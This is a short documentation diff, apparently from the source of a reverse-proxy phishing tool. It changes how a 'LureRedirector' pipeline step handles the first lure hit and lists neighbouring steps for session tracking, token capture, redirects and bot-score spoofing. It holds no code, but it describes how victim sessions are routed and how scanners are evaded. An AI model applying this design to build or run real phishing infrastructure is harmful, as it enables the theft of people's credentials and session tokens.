@@ -43,8 +43,8 @@ and the handler is responsible for writing a complete response to
     user-agents), then loads or creates the session from the tracking cookie;
     redirects completed sessions to the lure's redirect URL via 302;
     sets ctx.Session, ctx.IsNewSession
- 9. LureRedirector    — immediately redirects sessions that have already
-    completed token capture to the lure's configured redirect URL
+ 9. LureRedirector    — on the initial lure hit (request path matches the lure
+    path), transparently rewrites the path to the phishlet's login path
  10. PuppetOverrideResolver — looks up cached puppet telemetry for the active
     phishlet and sets ctx.PuppetOverride
  11. TelemetryScoreCheck — L2 bot score; spoofs sessions that exceed the threshold
